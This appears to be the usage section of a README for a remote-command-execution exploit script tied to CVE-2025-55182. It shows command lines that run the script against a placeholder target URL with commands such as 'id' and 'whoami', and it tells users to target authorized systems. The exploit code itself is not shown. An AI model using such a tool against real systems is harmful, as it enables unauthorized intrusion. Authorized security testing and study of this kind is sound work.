## Usage

Run the script against an authorized target by providing the target URL and the command you want to execute.

```bash
python3 CVE-2025-55182.py -u http://TARGET_URL/ -c "id"
```

You can also use the long-form arguments:

```bash
python3 CVE-2025-55182.py --url http://TARGET_URL/ --command "whoami"
```

## Help

To view all available options and arguments:

```bash
python3 CVE-2025-55182.py -h
```
